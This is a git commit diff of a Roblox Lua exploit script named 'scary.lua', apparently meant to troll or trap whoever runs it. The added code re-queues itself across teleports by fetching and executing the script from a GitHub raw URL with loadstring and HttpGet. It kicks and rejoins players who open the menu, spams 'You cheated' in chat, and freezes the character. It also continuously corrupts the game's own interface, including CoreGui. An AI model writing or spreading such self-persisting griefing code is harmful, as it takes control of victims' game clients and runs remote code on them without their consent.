33259923247dc3794ae8f43a4d3702c3e597adfe
buhh <108026120+buhhhhg@users.noreply.github.com>
2024-11-05 20:26:14 +0500

    Update scary.lua

--- scary.lua
+++ scary.lua
@@ -1,4 +1,5 @@
-queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+noFunction = function(...) end
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or noFunction
 
 Lighting = game:GetService("Lighting")
 ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -7,11 +8,30 @@ Players = game:GetService("Players")
 StarterGui = game:GetService("StarterGui")
 GuiService = game:GetService("GuiService")
 TeleportService = game:GetService("TeleportService")
+CoreGui = game:GetService("CoreGui")
 
 Players.LocalPlayer.OnTeleport:Connect(function(State)
-    if queueteleport then
+    if queueteleport and queueteleport ~= noFunction then
         queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
     end
+end)
+
+PlaceId, JobId = game.PlaceId, game.JobId
+
+GuiService.MenuOpened:Connect(function()
+	if #Players:GetPlayers() <= 1 then
+		Players.LocalPlayer:Kick("\nNice try. You cant escape")
+		wait()
+        if queueteleport and queueteleport ~= noFunction then
+            queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
+		end
+        TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+	else
+        if queueteleport and queueteleport ~= noFunction then
+            queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/buhhhhg/RobloxScriptz/refs/heads/main/scary.lua'))()")
+		end
+        TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
+	end
 end)
 
 LocalPlayer = Players.LocalPlayer
@@ -26,7 +46,9 @@ coreGuiTypeNames = {
 }
 
 for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
-    table.insert(coreGuiTypeNames, enumItem)
+    if not string.find(enumItem.Name:lower(), "selfview") then
+        table.insert(coreGuiTypeNames, enumItem)
+    end
 end
 
 function chatMessage(str)
@@ -80,13 +102,13 @@ task.spawn(function()
 end)
 
 for i=1,3 do
-    chatMessage('You cheated.')
+    chatMessage('You cheated. '..randstr(math.random(10, 20)))
 end
 
 task.spawn(function()
     while task.wait(12) do
         for i=1,3 do
-            chatMessage('You cheated.')
+            chatMessage('You cheated. '..randstr(math.random(10, 20)))
         end
     end
 end)
@@ -113,3 +135,104 @@ task.spawn(function()
         end
     end
 end)
+
+task.spawn(function()
+    Character = LocalPlayer.Character
+    Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0) 
+    workspace.Gravity = 0
+    while task.wait(0.01) do
+        Character = LocalPlayer.Character
+        Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+        if Character and Humanoid then
+            Humanoid.PlatformStand = true
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.01) do
+        Character = LocalPlayer.Character
+        if Character then
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.01) do
+        Character = LocalPlayer.Character
+        if Character then
+            table.foreach(Character:GetDescendants(), function(_, x)
+                if x:IsA("BodyGyro") or x:IsA("BodyVelocity") then
+                    x:Destroy()
+                end
+            end)
+        end
+    end
+end)
+
+PlayerGui = Players.LocalPlayer.PlayerGui
+oo = {true, false}
+hui = get_hidden_gui or gethui or function(...) return CoreGui.HiddenUI or nil end
+huiP = hui()
+
+properties = {
+    Name = randstr(100),
+    Text = randstr(100),
+    BackgroundColor3 = Color3.new(255, 0, 0),
+    BorderColor3 = Color3.new(0, 0, 0),
+    TextScaled = oo[math.random(1,#oo)],
+}
+
+propertiesCG = {
+    Name = randstr(100),
+    Text = randstr(100),
+    BackgroundColor3 = Color3.new(255, 0, 0),
+    BorderColor3 = Color3.new(0, 0, 0),
+    Visible = oo[math.random(1,#oo)],
+}
+
+task.spawn(function()
+    while task.wait(0.01) do
+        for _, gui in PlayerGui:GetDescendants() do
+            for property, value in properties do
+                pcall(function() gui[property] = value end)
+                task.wait()
+            end
+            task.wait()
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.01) do
+        for _, gui in CoreGui:GetDescendants() do
+            for property, value in propertiesCG do
+                pcall(function() gui[property] = value end)
+                task.wait()
+            end
+            task.wait()
+        end
+    end
+end)
+
+if huiP then
+    task.spawn(function()
+        while task.wait(0.01) do
+            for _, gui in huiP:GetDescendants() do
+                if gui.Name ~= "RobloxGui" and not string.find("robloxgui", gui:GetFullName():lower()) then
+                    for property, value in propertiesCG do
+                        pcall(function() gui[property] = value end)
+                        task.wait()
+                    end
+                    task.wait()
+                end
+            end
+        end
+    end)
+end
